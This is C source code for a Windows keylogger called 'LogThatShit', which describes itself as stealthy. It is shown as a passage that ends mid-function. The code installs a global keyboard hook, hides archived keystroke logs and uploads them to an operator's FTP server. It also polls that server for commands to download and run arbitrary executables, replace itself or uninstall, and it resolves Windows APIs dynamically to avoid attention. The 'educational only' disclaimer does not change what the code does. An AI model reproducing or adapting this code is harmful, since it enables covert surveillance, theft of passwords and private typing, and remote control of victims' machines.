
// LogThatShit 
//		A stealthly keylogger designed on and for Windows XP 
//		By Isam M. <r0cket(NO_SPAM)jump@yahoo.com> 
//    http://biodegradablegeek.com

// This software file (the "File") is distributed under the terms of the 
// GNU General Public License Version 3, (the "License"). You may use, 
// redistribute and/or modify this File in accordance with the terms and 
// conditions of the License, a copy of which is available along with the 
// File in the license.txt file or by writing to 
//  Free Software Foundation, Inc., 
//  59 Temple Place, 
//  Suite 330, Boston, MA, 02111-1307 
//  
//  or on the Internet at http://www.gnu.org/licenses/gpl.txt.

// THE FILE IS DISTRIBUTED AS-IS, WITHOUT WARRANTY OF ANY KIND. THE AUTHOR 
// DOES NOT TAKE ANY RESPONSIBILITY FOR ANY DAMAGE OR LEGAL ISSUES YOU MAY 
// FACE WHEN USING THIS APPLICATION. PLEASE NOTE THAT LTS WAS WRITTEN AND 
// RELEASED FOR *EDUCATIONAL* PURPOSES ONLY AND IS NOT INTENDED TO BE USED 
// FOR ANYTHING THAT MAY BE AGAINST THE LAW WHERE YOU LIVE. IF YOU DO NOT 
// WANT THAT RESPONSIBILITY, PLEASE DONT COMPILE OR USE THIS APPLICATION.



#include <stdio.h> 
#include <stdlib.h> 
#include <string.h> 
#include <wininet.h> 
#include <windows.h> 
#include "Injection.h" 
#include "Common.h" 
#include "Settings.h" 


char execfile[MAX_PATH+1]; 
char removefile[MAX_PATH+1]; 
char updatefile[MAX_PATH+1]; 
char logfile[MAX_PATH+1]; 
char path2me[MAX_PATH+1]; 
LTSSettings settings; 
HANDLE mutex_status; 
HANDLE mutex_log; 
HANDLE mutex_ftp; 


char* GetBaseNameStart(char* path) { 
	/*	Return a pointer to where the basename starts in 'path' 
		Works for \ / and mixed slashes in a path. */ 
	unsigned int index; 
	unsigned int len; 

	/* Iterate path backwards looking for the last slash in path. */ 
	len = strlen(path); 
	for (index = len-1; index; --index) 
		if ('/'==path[index] || '\\'==path[index]) break; 

	if (index || path[index] == '/' || path[index] == '\\') return path+index+1; 
	return path; 
}


int strtoint(const char* const str) { 
	/*	Convert "123" to an int 123. Uses a very  basic algorithm 
		but this won't be used much so no worry. -1 on error. 
		Works for positive #s only. */
	int i, n, mult, ret; 
	if (!str) return -1; 
	ret=0; 
	n = strlen(str); 
	mult = 1; 
	for (i=n-1; i>=0; --i, mult*=10) 
		ret += ((str[i]-'0') * mult); 
	return ret; 
} 


HINTERNET OpenInternetSession() { 
	/* Open an internet session. Returns internet handle. */ 
	HINTERNET inet = InternetOpen("", INTERNET_OPEN_TYPE_DIRECT, 0, 0, 0);
	if (!inet) {
		WIE_ERR("*** ERROR: InternetOpen() failed"); 
		return 0; 
	} 
	return inet; 
} 


HINTERNET ConnectToFtp(HINTERNET internet) { 
	/* Connect to the FTP site via the passed internet session. Returns internet handle. */ 
	HINTERNET service = InternetConnect(internet, \
									settings.ftphost, \
									INTERNET_INVALID_PORT_NUMBER, \
									settings.ftpuser, \
									settings.ftppass, \
									INTERNET_SERVICE_FTP, 0, 0); 
	if (!service) { 
		WIE_ERR("*** ERROR: InternetConnect() failed"); 
		return 0; 
	} 

	return service; 
} 


int UploadFileToFtp(HINTERNET service, const char* const local, const char* const remote) { 
	/* We are connected to the FTP. Attempt to upload the file. Return 1 on success, 0 on failure. */ 
	return FtpPutFile(service, local, remote, FTP_TRANSFER_TYPE_BINARY, 0); 
} 


int DownloadAndExecuteFile(HINTERNET service) { 
	/* Download the file to the same path we store the log in. Return 1 on success, 0 otherwise. */ 
	char file[MAX_PATH+1]; 
	char tmppath[MAX_PATH+1]; 

	/* Construct the local file name. */ 
	GetTempPath(MAX_PATH, tmppath); 
	GetTempFileName(tmppath, "JAV", 0, file); 
	snprintf(file, MAX_PATH, "%s.exe", file); 
	file[MAX_PATH] = '\0'; 

	if (FtpGetFile(service, execfile, file, 0, 
												FILE_ATTRIBUTE_HIDDEN, 
												FTP_TRANSFER_TYPE_BINARY, 0)) { 
		PROCESS_INFORMATION proc; 
		STARTUPINFO startup; 
		int ret; 

		/* This is probably not neccessary, but let's just listen to MSDN. The file will NOT be hidden. */ 
		ZeroMemory(&startup, sizeof(STARTUPINFO)); 
		startup.cb = sizeof(STARTUPINFO); 
		/*startup.dwFlags = STARTF_USESHOWWINDOW; 
		startup.wShowWindow = SW_HIDE; */ 

		/* Attempt to execute the downloaded file. */ 
		ret = CreateProcess(file, 0, 0, 0, 0, 0, 0, 0, &startup, &proc); 
		INFO("** Execution file has been downloaded and removed."); 
		return ret; /* CreateProcess returns 0 on failure. */ 
	} 

	WIE_ERR("*** ERROR: Unable to download file for execution."); 
	return 0; 
} 


int DownloadAndInstallUpdate(HINTERNET service) { 
	/* Replace our loader with the new downloaded one. Return 1 on success, 0 otherwise. */ 
	char file[MAX_PATH+1]; 
	char tmppath[MAX_PATH+1]; 

	/* Get a temporary name. */ 
	GetTempPath(MAX_PATH, tmppath); 
	GetTempFileName(tmppath, "JAV", 0, file); 

	/* Download the file, but don't overwrite ourself yet. */ 
	if (FtpGetFile(service, updatefile, file, 0, FILE_ATTRIBUTE_HIDDEN, FTP_TRANSFER_TYPE_BINARY, 0)) { 
		int ret; 
		FILE* fp; 

		/* Look for the 'LTS' signuture appended to an LTS executable. If it exists, assume it's valid. */ 
		fp = fopen(file, "r"); 
		if (!fp) {
			INFO("*** ERROR: Unable to open update to check validity."); 
			return 0; 
		}

		fseek(fp, -3, SEEK_END); 

		ret = 0; /* Assume a failure. */ 
		if ('L'==fgetc(fp) && 'T'==fgetc(fp) && 'S'==fgetc(fp)) { 
			/* We have the tag. Assume this file is a valid update (if it's not, it will fuck us over on the next restart) */ 
			FARPROC pCopyFile; 

			/* attempt to overwrite our own loader with it. */ 
			pCopyFile = GetProcAddress(GetModuleHandle("Kernel32.dll"), "CopyFileA"); 
			if (!pCopyFile) { 
				WIN_ERR("Could not get address of CopyFileA"); 
				return 0; 
			} 
			ret = pCopyFile(file, path2me, 0); /* CopyFile() returns 0 on failure. */ 
		} else {
			INFO("*** ERROR: Update file is NOT valid! Not updating."); 
		} 

		/* remove() will fail if we do not close the file. */ 
		fclose(fp); 

		/* Either way, remove the temporary update file. */ 
		remove(file); 
		if (!ret) { 
			INFO("*** ERROR: Unable to copy update file over our loader."); 
		} else { 
			INFO("** Successfully updated!"); 
		} 
		return ret; 
	} 

	INFO("*** ERROR: Unable to download update!"); 
	return 1; 
} 


DWORD WINAPI UploadLog() { 
	/*	Handle uploading of the logs. The current log is archived when it reaches a certain 
		size. It is then uploaded and deleted. Return 1 on failure, 0 on success. */ 
	HINTERNET net; 
	HINTERNET service; 
	char wild[MAX_PATH+1]; 
	char remotepart[MAX_PATH+1]; 
	char local[MAX_PATH+1]; 
	char remote[MAX_PATH+1]; 
	unsigned int id; 
	char SetAsRoot; 
	HANDLE h; 
	WIN32_FIND_DATA fd; 
	SYSTEMTIME st; 

	/*	Some FTPs won't allow a lot of logins in at one time. If we are still connected 
		from the last iteration, don't bother doing shit until that connection is done. */ 
	WaitForSingleObject(mutex_ftp, MUTEX_WAIT_MS); 

	/* Let's attempt to connect to the FTP, no point in going on if we can't do that. */ 
	net = OpenInternetSession(); 
	if (!net) { 
		ReleaseMutex(mutex_ftp); 
		return 1; 
	} 

	service = ConnectToFtp(net); 
	if (!service) { 
		ReleaseMutex(mutex_ftp); 
		return 1; 
	} 

	/*	We are connected to the FTP. Let's iterate through all the archived files that we are to upload. 
		Start by constructing the wildcard. */ 
	snprintf(wild, MAX_PATH, "%s.temp.*", logfile); 
	wild[MAX_PATH] = '\0'; 

	/* Look for all files matching the wildcard. */ 
	h = FindFirstFile(wild, &fd); 
	if (!h || INVALID_HANDLE_VALUE==h) {
		ReleaseMutex(mutex_ftp); 
		return 1; 
	} 

	/* Need the time to construct the remote file name. */ 
	GetLocalTime(&st); 

	/*	We might have multiple archived files. They will likely be uploaded at around the same time, 
		so we can not just use the time to construct the file name. They might collide and the newer file 
		will overwrite the old one. So we will only construct the file name using the time once, and then 
		append an ID to each file name. */ 

		/* Construct first part of the remote file name. This format is /ftp/dir/alias_MMDDYYYY_HHMMSS */ 
		snprintf(remotepart, MAX_PATH, "%s/%s_%.2d%.2d%.4d_%.2d%.2d%.2d", settings.ftproot, \
										settings.alias, st.wMonth, st.wDay, st.wYear, st.wHour, st.wMinute, st.wSecond); 
		remotepart[MAX_PATH] = '\0'; 

	id = 1; 
	SetAsRoot = 0; 
	do { 
		/* Construct the archived file's path. We only have the file name, we need an absolute path. */ 
		snprintf(local, MAX_PATH, "%s/%s", settings.path, fd.cFileName); 
		local[MAX_PATH] = '\0'; 

		/* Construct the full remote file name. This is the first part followed by an Id and '.log' */ 
		snprintf(remote, MAX_PATH, "%s_%d.log", remotepart, id); 
		remote[MAX_PATH] = '\0'; 

		/* We have the local and remote file names. Let's attempt to upload the file */ 
#ifdef DEBUG_MODE 
		printf("** Attempting to upload log %s...\n", local); 
#endif 

		if (!UploadFileToFtp(service, local, remote)) { 
			INFO("*** ERROR: Unable to upload file to FTP. If we have not, we will attempt to upload to the root FTP dir."); 
			/* Maybe the path does not exist? Try to upload to the root FTP dir. First, check if we just DID try the root dir. */ 
			if (!strcmpi2(settings.ftproot, "/", MAX_PATH)) { 
				ReleaseMutex(mutex_ftp); 
				InternetCloseHandle(service); 
				InternetCloseHandle(net); 
				WIE_ERR("Could not upload file. Returning.."); 
				return 1; /* That WAS the root FTP dir. What can we do? Just return. */ 
			} else { 
				char newremote[MAX_PATH+1]; 
				/*	OK, we did not try uploading to the root FTP dir. Let's do that now. 
					Start by reconstructing the remote file name. We just append the base name to '/' */ 
				snprintf(newremote, MAX_PATH, "/%s", GetBaseNameStart(remote)); 
				newremote[MAX_PATH] = '\0'; 

				if (!UploadFileToFtp(service, local, newremote)) { 
					WIE_ERR("Failed uploading file to root FTP dir."); 
					ReleaseMutex(mutex_ftp); 
					InternetCloseHandle(service); 
					InternetCloseHandle(net); 
					return 1; /* That didn't work either. The problem is else where. Let's just return. */ 
				} 

				if (!SetAsRoot) { 
					/*	Since uploading to the root FTP dir worked. We will set this as the ftproot so 
						that we can search it for special files. 
					XXX This sucks, fix it. ALWAYS check for correct dir. */ 
					free(settings.ftproot); 
					settings.ftproot = "/"; 

					/* Re-set these paths, since we have a new ftproot. */ 
					snprintf(execfile, MAX_PATH, "%s/%s", settings.ftproot, settings.exec); 
					execfile[MAX_PATH] = '\0'; 
					snprintf(removefile, MAX_PATH, "%s/%s", settings.ftproot, settings.remove); 
					removefile[MAX_PATH] = '\0'; 
					snprintf(updatefile, MAX_PATH, "%s/%s", settings.ftproot, settings.update); 
					updatefile[MAX_PATH] = '\0'; 
					SetAsRoot = 1; 
				} 
			} 
		} 

		/* If we reached here, we have successfully uploaded the file. Let's delete the local version. */ 
		remove(local); 

		++id; 
	} while (FindNextFile(h, &fd)); 
	FindClose(h); 

	/*	We have uploaded the log file(s). Let's look on the FTP for 
		any special file names (remove, exec, update, etc) and handle 
		them accordingly.  We want to rename the files after using them. */ 
	HandleSpecialFileNames(service); 

	ReleaseMutex(mutex_ftp); 
	InternetCloseHandle(service); 
	InternetCloseHandle(net); 
	return 0; 
} 


int HandleSpecialFileNames(HINTERNET service) { 
	/*	Check for a remove/update/exec/etc file and handle it accordingly. Return 0 on success. 1 on failure. */ 
	HANDLE find; 
	WIN32_FIND_DATA fd; 
	char AttemptedExec, AttemptedRemove, AttemptedUpdate; 

	INFO("Looking for special files on the FTP..."); 
	INFO(settings.ftproot); 
	/* Find the first file. Do not cache directly listing. We want it in from the FTP. */ 
	find = FtpFindFirstFile(service, settings.ftproot, &fd, INTERNET_FLAG_NO_CACHE_WRITE, 0); 
	if (!find) {
		WIE_ERR("** Found no special file names on the FTP dir."); 
		return 1; 
	} 

	/* Enumerate the FTP dir. */ 
	AttemptedExec = AttemptedRemove = AttemptedUpdate = 0; 

	/* Keep going until all the above flags are set. */ 
	while (!AttemptedExec || !AttemptedRemove || !AttemptedUpdate) { 
		/* If what we found is NOT a directory.. */ 
		if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) { 
			/* Check if it's one of 'special' file names that we are to handle. */ 
			if (!AttemptedExec && !strcmpi2(fd.cFileName, settings.exec, MAX_PATH)) { 
				/* Let's download and execute the file. */ 
				INFO("** Found EXEC file. Handling it..."); 
				if (DownloadAndExecuteFile(service)) { 
					/* SUCCESS. Rename the file to filename.exe.ran indicating success. */ 
					char newname[MAX_PATH+1]; 

					/* Construct the new name. */ 
					snprintf(newname, MAX_PATH, "%s.ran", execfile); 
					newname[MAX_PATH] = '\0'; 
					INFO("** Success. Attempting to rename execution file on FTP *.ran"); 

					/* Attempt renaming the file. */ 
					FtpRenameFile(service, execfile, newname); 
				} else { 
					/* FAILURE. Rename the file to filename.exe.err indicating failure. */ 
					char newname[MAX_PATH+1]; 

					/* Construct the new name. */ 
					snprintf(newname, MAX_PATH, "%s.err", execfile); 
					newname[MAX_PATH] = '\0'; 
					INFO("** Failure. Attempting to rename execution file on FTP to *.err"); 

					/* Attempt renaming the file. */ 
					FtpRenameFile(service, execfile, newname); 
				} 

				/* When all the Attempted* flags are set, we will stop enumerating. */ 
				AttemptedExec = 1; 

			} else if (!AttemptedRemove && !strcmpi2(fd.cFileName, settings.remove, MAX_PATH)) { 
				/* Attempt to uninstall ourself. */ 
				INFO("** Found REMOVE file. Handling it..."); 

				/*	Set a mutex which the main timer is polling. When the main timer is able to open this mutex, it 
					will remove the hook and start cleaning up. Then it will delete it's startup key and files. */ 
				if (CreateMutex(0, 0, MUTEX_NAME_REMOVE) || GetLastError()==ERROR_FILE_EXISTS) { 
					/* SUCCESS. Created the mutex. Let's rename remove.ext to remove.ext.ran */ 
					char newname[MAX_PATH+1]; 
					INFO("** Created remove mutex. Renaming the remove file and then we will be uninstalled."); 

					/* Construct the new name. */ 
					snprintf(newname, MAX_PATH, "%s.ran", removefile); 
					newname[MAX_PATH] = '\0'; 

					/* Attempt renaming the file. */ 
					FtpRenameFile(service, removefile, newname); 

					/* We are going to be removed on the next iteration. No point in updating ourself or doing anything else. */ 
					FindClose(find); 
					return 0; 

				} else { 
					char newname[MAX_PATH+1]; 
					/* FAILURE. Unable to create the mutex. Let's rename remove.ext to remove.ext.err */ 
					WIN_ERR("*** ERROR: Unable to create the 'remove' mutex. I will live forever."); 

					/* Construct the new name. */ 
					snprintf(newname, MAX_PATH, "%s.err", removefile); 
					newname[MAX_PATH] = '\0'; 

					/* Attempt renaming the file. */ 
					FtpRenameFile(service, removefile, newname); 
				} 

				/* When all the Attempted* flags are set, we will stop enumerating. */ 
				AttemptedRemove = 1; 

			} else if (!AttemptedUpdate && !strcmpi2(fd.cFileName, settings.update, MAX_PATH)) { 
				/* Attempt to update ourself from this file. */ 
				INFO("** Found UPDATE file. Handling it..."); 

				if (DownloadAndInstallUpdate(service)) { 
					/* SUCCESS. Rename the file to filename.exe.ran indicating success. */ 
					char newname[MAX_PATH+1]; 

					/* Construct the new name. */ 
					snprintf(newname, MAX_PATH, "%s.ran", updatefile); 
					newname[MAX_PATH] = '\0'; 

					/* Attempt renaming the file. */ 
					FtpRenameFile(service, updatefile, newname); 
				} else { 
					/* FAILURE. Rename the file to filename.exe.err indicating failure. */ 
					char newname[MAX_PATH+1]; 

					/* Construct the new name. */ 
					snprintf(newname, MAX_PATH, "%s.err", updatefile); 
					newname[MAX_PATH] = '\0'; 

					/* Attempt renaming the file. */ 
					FtpRenameFile(service, updatefile, newname); 
				} 

				/* When all the Attempted* flags are set, we will stop enumerating. */ 
				AttemptedUpdate = 1; 
			} 
		} 

		if (!InternetFindNextFile(find, &fd)) break; 
	} 

	FindClose(find); 
	INFO("HandleSpecialFiles is done."); 
	return 0; 
} 


void ArchiveLog() { 
	/*	Gotta archive the current log. Copy it to currentname.X, X being an int. 
		UploadLog() will search locally for a wildcard, so this archived file should get 
		uploaded as well. Not to mention other files *might* get uploaded, but that's 
		very rare. */ 
	char newlog[MAX_PATH+1]; 
	unsigned int i; 
	FARPROC pCopyFile; 
	FILE *tmp; 

	/*	Try to construct a new name until you find one that does not exist. 
		Will only take 5000 tries. If each log can only be 10 Kilobytes, that 
		is 5000*10K = ~50,000K = ~50 Megabytes of logs. */ 
	for (i=0; i<5000; ++i) { 
		snprintf(newlog, MAX_PATH, "%s.temp.%u", logfile, i); 
		newlog[MAX_PATH] = '\0'; 

		/* Lame way of checking if the file exists. */ 
		WaitForSingleObject(mutex_log, MUTEX_WAIT_MS); 
		tmp = fopen(newlog, "r"); 
		if (!tmp) { 
			break; /* Assume this means the file does not exist. */ 
		} 

		fclose(tmp); 
		/* Give another thread a chance to use it. */ 
		ReleaseMutex(mutex_log); 
	} 

	/* UploadLog() will delete this log once it can be successfully uploaded. */ 
	pCopyFile = GetProcAddress(GetModuleHandle("Kernel32.dll"), "CopyFileA"); 
	pCopyFile(logfile, newlog, 0); 
	ReleaseMutex(mutex_log); 

	/* Make archived log hidden. */ 
	SetFileAttributes(newlog, FILE_ATTRIBUTE_HIDDEN); 

#ifdef DEBUG_MODE 
	printf("** Archived file %s as %s\n", logfile, newlog); 
#endif 
} 


void SetLogStatus(LogStatus reason) { 
	/* Handle archiving / clearing of the log file */ 
	HANDLE mm; 
	char* p; 

	if (reason==INITIAL_LOG) { 
		/*	This is the first time the app is being ran. Create a memory mapped buffer and write 
			the new log file path to it. LTSHook.dll::HookProc will read from this. */ 
		mm = CreateFileMapping(INVALID_HANDLE_VALUE, 0, PAGE_READWRITE, 0, MAX_PATH, LTS_MMBUF_LOGFILE); 
		if (!mm) {
			WIN_ERR("Unable to create memory mapped buffer for log path."); 
			return; 
		} 

		p = MapViewOfFile(mm, FILE_MAP_ALL_ACCESS, 0, 0, MAX_PATH); 
		if (!p) {
			WIN_ERR("Unable to map a view of mapped file to get log path."); 
			return; 
		} 

		CopyMemory(p, logfile, MAX_PATH); 
		UnmapViewOfFile(p); 
	} 

	/*	Update the reason in the mapped buffer so all the DLL instances are able to read the change. 
		DLL will check 'reason' to see if this to see if it should clear the log. */ 
	WaitForSingleObject(mutex_status, MUTEX_WAIT_MS); 
	mm = OpenFileMapping(FILE_MAP_ALL_ACCESS, 0, LTS_MMBUF_STATUS); 
	if (!mm) { 
		mm = CreateFileMapping(INVALID_HANDLE_VALUE, 0, PAGE_READWRITE, 0, sizeof(LogStatus), LTS_MMBUF_STATUS); 
		if (!mm) { 
			WIN_ERR("Unable to create file mapping for log status in injection DLL"); 
			ReleaseMutex(mutex_status); 
			return; 
		} 
	} 

#ifdef DEBUG_MODE 
	if (!mm) INFO("Unable to open/create status mutex."); 
#endif 

	p = MapViewOfFile(mm, FILE_MAP_ALL_ACCESS, 0, 0, sizeof(LogStatus)); 
	if (!p) { 
		WIN_ERR("Unable to map a view of mapped file holding reason in RotateLog()"); 
		ReleaseMutex(mutex_status); 
		return; 
	} 

	/* Write the new reason to the mapped buffer. */ 
	CopyMemory(p, &reason, sizeof(LogStatus)); 
	UnmapViewOfFile(p); 
	ReleaseMutex(mutex_status); 
} 


int GetSettings() { 
	/*	Settings are in a memory mapped buffer. Let's get and parse them. 
		Return 0 on success, 1 on failure. */ 
	HANDLE mm; 
	char* p; 
	char* block; 
	unsigned int blocksz; 

	/* Get data block size. */ 
	mm = OpenFileMapping(FILE_MAP_ALL_ACCESS, 0, LTS_MMBUF_BLOCK_SZ); 
	if (!mm) {
		WIN_ERR("Unable to open file mapping to read block size."); 
		return 1; 
	} 

	p = MapViewOfFile(mm, FILE_MAP_ALL_ACCESS, 0, 0, sizeof(unsigned int)); 
	if (!p) { 
		WIN_ERR("*** ERROR: Unable to map a view of mapped buf to read block sz."); 
		return 1; 
	} 

	CopyMemory(&blocksz, p, sizeof(unsigned int)); 
	UnmapViewOfFile(p); 

	/* We have the size. Allocate space and then copy the block over. */ 
	block = malloc(blocksz); 
	if (!block) { 
		WIN_ERR("malloc() failed. Unable to allocate space for block in injection dll"); 
		return 1; 
	} 

	mm = OpenFileMapping(FILE_MAP_ALL_ACCESS, 0, LTS_MMBUF_BLOCK); 
	if (!mm) {
		WIN_ERR("*** ERROR: Unable to open mapping for block."); 
		return 1; 
	} 

	p = MapViewOfFile(mm, FILE_MAP_ALL_ACCESS, 0, 0, blocksz); 
	if (!p) { 
		WIN_ERR("*** ERROR: Unable to map a view of mapped buf to read block."); 
		return 1; 
	} 

	CopyMemory(block, p, blocksz); 
	UnmapViewOfFile(p); 

	/* Get names and paths. */ 
	settings.alias = SettingsGetValue(block, blocksz, "ALIAS"); 
	settings.path = SettingsGetValue(block, blocksz, "PATH"); 
	settings.logname = SettingsGetValue(block, blocksz, "LOGNAME"); 
	settings.filename = SettingsGetValue(block, blocksz, "FILENAME"); 
	settings.hookname = SettingsGetValue(block, blocksz, "HOOKNAME"); 
	settings.injectname = SettingsGetValue(block, blocksz, "INJECTNAME"); 
	settings.exec = SettingsGetValue(block, blocksz, "EXEC"); 
	settings.remove = SettingsGetValue(block, blocksz, "REMOVE"); 
	settings.update = SettingsGetValue(block, blocksz, "UPDATE"); 

	/* Get log preferences. */ 
	p = SettingsGetValue(block, blocksz, "MAXLOGSIZE"); 
	settings.maxlogsize = strtoint(p); 
	free(p); 

	p = SettingsGetValue(block, blocksz, "LOGCHECKINT"); 
	settings.logcheckint = strtoint(p); 
	free(p); 

	/* Get FTP settings. */ 
	settings.ftproot = SettingsGetValue(block, blocksz, "ROOT"); 
	settings.ftphost = SettingsGetValue(block, blocksz, "HOST"); 
	settings.ftpuser = SettingsGetValue(block, blocksz, "USER"); 
	settings.ftppass = SettingsGetValue(block, blocksz, "PASS"); 
	settings.ftpport = 21; /* WinInet only supports the standard FTP port. */ 

	/* Save some paths, we need these later on. */ 
	snprintf(execfile, MAX_PATH, "%s/%s", settings.ftproot, settings.exec); 
	execfile[MAX_PATH] = '\0'; 
	snprintf(removefile, MAX_PATH, "%s/%s", settings.ftproot, settings.remove); 
	removefile[MAX_PATH] = '\0'; 
	snprintf(updatefile, MAX_PATH, "%s/%s", settings.ftproot, settings.update); 
	updatefile[MAX_PATH] = '\0'; 
	snprintf(logfile, MAX_PATH, "%s/%s", settings.path, settings.logname); 
	snprintf(path2me, MAX_PATH, "%s/%s", settings.path, settings.filename); 


	/* DLL needs flags. Loader will close soon, we can't depend on it to hold them. */ 
	mm = OpenFileMapping(FILE_MAP_ALL_ACCESS, 0, LTS_MMBUF_FLAGS); 
	if (!mm) { 
		WIN_ERR("Unable to open file mapping to hold flags."); 
		return 1; 
	} 

	return 0; 
} 


DWORD WINAPI main2() { 
	char tmp[MAX_PATH+1]; 
	HINSTANCE DllInst; 
	HOOKPROC proc; 
	HHOOK hook; 
	FARPROC pSetWindowsHookEx; 
	FARPROC pUnhookWindowsHookEx; 
	MSG msg; 
	HANDLE h; 
	HANDLE oneinstance; 
	char uninstall; 
	HMODULE user32; 

	/*	This mutex is to show that an instance of LTS is already running. It has already 
	 	been created, we just need to hang on to it. */ 
	oneinstance = OpenMutex(MUTEX_ALL_ACCESS, 1, MUTEX_NAME_RUNNING); 
	if (!oneinstance) { 
		WIN_ERR("Could not open running-mutex in Injection DLL."); 
		return 1; 
	} 

	/* Get settings from mapped buf. */ 
	if (GetSettings()) { 
		INFO("Failed to get settings. Not going on."); 
		/* If we do not create this mutex, the loader will NOT terminate. */ 
		CreateMutex(0, 0, MUTEX_NAME_DONE); 
		CloseHandle(oneinstance); 
		return 1; 
	} 

	/* If we do not create this mutex, the loader will NOT terminate. */ 
	CreateMutex(0, 0, MUTEX_NAME_DONE); 

	/* SetWindowsHookEx requires that HookProc is in a DLL. Let's load the DLL now */ 
	snprintf(tmp, MAX_PATH, "%s/%s", settings.path, settings.hookname); 
	tmp[MAX_PATH] = '\0'; 

	DllInst = LoadLibrary(tmp); 
	if (!DllInst) { 
		WIN_ERR("Could not load DLL hook. I am going to just die."); 
		return 1; /* We can not recover from this. Exit. */ 
	} 

	/* and get the hook proc address. */ 
	proc = (HOOKPROC)GetProcAddress(DllInst, "HookProc"); 
	if (!proc) { 
		WIN_ERR("Unable to get proc address"); 
		return 1; /* We can not recover from this. Exit. */ 
	} 

	/* This will be used to handle synchronization of who controls the log / flags. */ 
	mutex_log = CreateMutex(0, 0, MUTEX_NAME_LOG); 
	if (!mutex_log) { 
		if (GetLastError()==ERROR_ALREADY_EXISTS) { 
			INFO("Unable to create log mutex. Already exists. Attempting to continue.."); 
		} else { 
			WIN_ERR("Unable to create mutex for 'log'"); 
			return 1; 
		} 
	} 

	mutex_status = CreateMutex(0, 0, MUTEX_NAME_STATUS); 
	if (!mutex_status) { 
		if (GetLastError()==ERROR_ALREADY_EXISTS) {
			INFO("Unable to create reason mutex. Already exists. Attempting to continue."); 
		} else { 
			WIN_ERR("Unable to create mutex for 'reason'"); 
			return 1; 
		} 
	} 

	mutex_ftp = CreateMutex(0, 0, MUTEX_NAME_FTP); 
	if (!mutex_ftp) { 
		if (GetLastError()==ERROR_ALREADY_EXISTS) {
			INFO("Unable to create FTP mutex. Already exists. Attempting to continue."); 
		} else { 
			WIN_ERR("Unable to create mutex for 'FTP'"); 
			return 1; 
		} 
	} 

	/*	Set up a timer. It will check the log size every N seconds. */ 
	if (!SetTimer(0, 0, settings.logcheckint * 1000, 0)) { 
		WIN_ERR("Failed to set timer!"); 
		return 1; 
	} 
/*	char xy[200]; 
	snprintf(xy, 200, "Timer=%u * 1000 = %u (%u, %u)\n", settings.logcheckint, settings.logcheckint*1000, 1, 2); //, USER_TIMER_MINIMUM, USER_TIMER_MAXIMUM); 
	MessageBox(0, xy, "hey", 0); */

	/* Load initial log path. */ 
	SetLogStatus(INITIAL_LOG); 

	/* Set up the hook and then go into a (mostly idle) message loop. */ 
	user32 = LoadLibrary("user32.dll"); 
	if (!user32) { 
		WIN_ERR("Loading user32.dll has failed. Oh no! -- Quitting."); 
		return 1; 
	} 

	pSetWindowsHookEx = GetProcAddress(user32, "SetWindowsHookExA"); 
	if (!pSetWindowsHookEx) { 
		WIN_ERR("Could not get address of SetWindowsHookExA -- Quitting."); 
		return 1; 
	} 

/*	hook = SetWindowsHookEx(WH_KEYBOARD, (HOOKPROC)proc, DllInst, 0); */ 
	hook = (HHOOK)pSetWindowsHookEx(WH_KEYBOARD, (HOOKPROC)proc, DllInst, 0); 
	if (!hook) {
		WIN_ERR("Could not set keyboard hook. Quitting."); 
		return 1; 
	} 

	INFO("Hook installed. Logging has begun."); 

	/* Stay idle. We can't terminate else our hook is automatically removed by Windows. */ 
	uninstall = 0; 
	while (0 < GetMessage(&msg, 0, 0, 0)) { 
		if (WM_TIMER == msg.message) { /* We will get this msg every N seconds. */ 
			/*	Check filesize. If exceeded N size: 
				Upload the log file and set a flag to tell the hook to clear the 
				file before logging the next key stroke. */ 
			FILE *fp; 
			unsigned int sz; 
			HANDLE m; 

			/* Check if we should be uninstalled. UploadFile() will set a mutex. */ 
			m = OpenMutex(MUTEX_ALL_ACCESS, 0, MUTEX_NAME_REMOVE); 
			if (m) { 
				/*	The cleaning up will be handled AFTER this loop, so let's just 
				 	break. Before doing so, we will set a flag to tell this DLL to 
					remove the our loader/startup routine. */ 
				uninstall = 1; 
				ReleaseMutex(m); 
				CloseHandle(m); 
				break; 
			} 

			/* After getting the mutex, open the file for read permission. */ 
			WaitForSingleObject(mutex_log, MUTEX_WAIT_MS); 
			fp = fopen(logfile, "r"); 
			if (!fp) {
				/*INFO("Could not open output file to check size. Probably waiting for initial key stroke."); */ 
				ReleaseMutex(mutex_log); 
				continue; 
			} 

			/* and get the file size in bytes using a rather bad method. */ 
			fseek(fp, 0, SEEK_END); 
			sz = ftell(fp); 
			fclose(fp); 
			ReleaseMutex(mutex_log); 

#ifdef DEBUG_MODE 
			printf("\n** Log size checked in @ %u bytes (MAX=%u)\n", sz, settings.maxlogsize); 
#endif 
			/* If we reached maximum log size... */ 
			if (sz >= settings.maxlogsize) { 
				/*	After a successful upload, the log-clear flag gets set. But it's only read AFTER the next 
					keystroke. So if the log is 5000 bytes and gets uploaded. It is NOT cleared until the user 
					presses a key. If the user doesn't press a key, the log will keep getting uploaded. So let's 
					check to see if the log-clear flag has been set. If so, DO NOT upload it again! */ 
				char* p; 
				HANDLE mm; 
				LogStatus reason; 

				WaitForSingleObject(mutex_status, MUTEX_WAIT_MS); 
				mm = OpenFileMapping(FILE_MAP_ALL_ACCESS, 0, LTS_MMBUF_STATUS); 
				if (!mm) { 
					WIN_ERR("Unable to open file mapping to get log status in injection dll."); 
					ReleaseMutex(mutex_status); 
					continue; 
				} 

				p = MapViewOfFile(mm, FILE_MAP_ALL_ACCESS, 0, 0, sizeof(LogStatus)); 
				if (!p) { 
					WIN_ERR("Unable to map view of file mapping to get log status in injection dll."); 
					ReleaseMutex(mutex_status); 
					continue; 
				} 

				CopyMemory(&reason, p, sizeof(LogStatus)); 
				UnmapViewOfFile(p); 
				ReleaseMutex(mutex_status); 

				/* Did the log get cleared yet? If not, don't upload it again. */ 
				if (reason==MAX_SZ) { 
/*					INFO("Log is set to be cleared on next key stroke. Not uploading again."); */ 
					continue; 
				} 
				INFO("Uploading log.."); 

				/* We will attempt to upload and then set a flag for the log to be cleared. */ 
				ArchiveLog(); 

				/* We don't need the handle. CreateThread() will end when it's done. */ 
				CloseHandle(CreateThread(0, 0, UploadLog, 0, 0, 0)); 

				/* Archived log already. We will upload the archived log, the current log can safely be cleared. */ 
				SetLogStatus(MAX_SZ); 
			} 
		} else { 
			/* Let Windows do its work, we don't want to get attention with 100% CPU usage. */ 
			TranslateMessage(&msg); 
			DispatchMessage(&msg); 
		} 
	} 

	/* Close / free some things. Not all, we need some later on if we are going to be uninstalled. */ 
	/*	UnhookWindowsHookEx(hook); */
